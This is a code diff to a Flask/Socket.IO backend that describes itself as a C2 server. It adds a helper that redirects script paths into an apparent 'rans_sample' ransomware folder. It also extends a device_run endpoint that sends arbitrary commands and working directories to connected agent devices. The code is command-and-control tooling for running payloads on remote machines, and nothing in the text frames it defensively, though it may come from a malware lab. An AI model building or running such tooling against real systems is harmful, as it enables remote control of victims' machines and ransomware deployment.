@@ -61,6 +61,21 @@ behavior = BehaviorSimulator(processor.work_directory)
 # Initialize Socket.IO with the real registry/processor
 socketio = init_socketio(app, devices_registry=DEVICES, processor=processor)
 
+# --- Compatibility: normalize historical Script A path ---
+def _normalize_script_command(cmd: str):
+    try:
+        if not isinstance(cmd, str) or not cmd:
+            return cmd, None
+        old_frag = r"\\Downloads\\sample\\py_simple\\agent_sync.py"
+        new_frag = r"\\Downloads\\rans-app\\rans_sample\\py_simple\\agent_sync.py"
+        if old_frag in cmd:
+            fixed = cmd.replace(old_frag, new_frag)
+            cwd = r"C:\\Users\\user\\Downloads\\rans-app\\rans_sample\\py_simple"
+            return fixed, cwd
+        return cmd, None
+    except Exception:
+        return cmd, None
+
 # --- C2 Files Directory (optional) ---
 # Configure a local directory to list/serve files from this backend. Useful when
 # running the backend on the same host that stores payloads/scripts.
@@ -897,12 +912,19 @@ def device_run():
         payload = request.get_json(force=True)
         token = (payload or {}).get('token')
         command = (payload or {}).get('command')
+        cwd = (payload or {}).get('cwd')
         if not token or not command:
             return jsonify({'error': 'bad_request', 'message': 'token and command required'}), 400
         info = DEVICES.get(token)
         if not info or not info.get('connected') or not info.get('sid'):
             return jsonify({'error': 'offline', 'message': 'device not connected'}), 400
-        socketio.emit('run_script', {'command': command}, to=info['sid'])
+        command, fix_cwd = _normalize_script_command(command)
+        if not cwd and fix_cwd:
+            cwd = fix_cwd
+        payload = {'command': command}
+        if isinstance(cwd, str) and cwd:
+            payload['cwd'] = cwd
+        socketio.emit('run_script', payload, to=info['sid'])
         return jsonify({'status': 'ok'})
     except Exception as e:
         return jsonify({'error': 'run_failed', 'message': str(e)}), 500
